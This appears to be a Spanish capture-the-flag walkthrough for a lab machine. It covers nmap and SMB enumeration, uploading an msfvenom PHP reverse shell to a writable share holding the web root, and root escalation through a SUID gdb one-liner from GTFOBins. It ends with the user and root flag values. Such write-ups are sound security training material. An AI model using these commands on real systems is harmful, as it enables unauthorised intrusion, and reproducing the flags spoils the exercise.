
```bash
arp-scan -I eth0 --localnet
nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 10.0.2.26 -oN escaneo
gobuster dir -u http://10.0.2.26/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
smbclient -L 10.0.2.26 -N
smbmap -H 10.0.2.26
smbmap -H 10.0.2.26 -r share
smbmap -H 10.0.2.26 -r share/html
smbclient //10.0.2.26/share/
```

Primero de todo buscamos la IP de la máquina realizando un arp-scan, una vez tenemos su IP realizamos un nmap para ver los puertos abiertos donde vemos que tiene los puertos 22, 80, 139 y 445 abiertos.
![[Pasted image 20240310021621.png]]
Primero realizamos fuzzing web pero no encontramos nada así que procedemos a atacar el protocolo samba mediante smbclient.
![[Pasted image 20240310022213.png]]
Ahora con smbmap vemos que podemos entrar al directorio share.
![[Pasted image 20240310022824.png]]
Entonces entramos y encontramos la carpeta html, que al entrar encontramos un archivo index.html que nos da a pensar que es el directorio en el que se encuentra alojada la web.
![[Pasted image 20240310023036.png]]
Ahora crearemos una reverse shell con msfvenom y la subiremos al protocolo smb.
```smb
cd html
put pwned.php
exit
```
![[Pasted image 20240310023530.png]]
Ahora ejecutaremos en la web el archivo pwned.php mientras estamos en escucha por el puerto 443 y una vez tenemos la conexion nos ponemos en escucha por el 4444 y mandamos una reverse shell para estabilizar la conexión, a continuación haremos el tratamiento de la TTY y encontramos la flag de user.![[Pasted image 20240310024032.png]]
```bash
cat /home/connection/local.txt
find / -perm -4000 2>/dev/null
gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
cat /root/proof.txt
```
Enumerando los SUID podemos observar que el gdb no debería de estar allí, así que buscamos un exploit en gtfobins para explotarlo
![[Pasted image 20240310025007.png]]
Ejecutando el exploit de gtfobins obtenemos una shell de root con la que conseguimos la flag de root.
![[Pasted image 20240310025421.png]]

Flag de user: 3f491443a2a6aa82bc86a3cda8c39617
Flag de root: a7c6ea4931ab86fb54c5400204474a39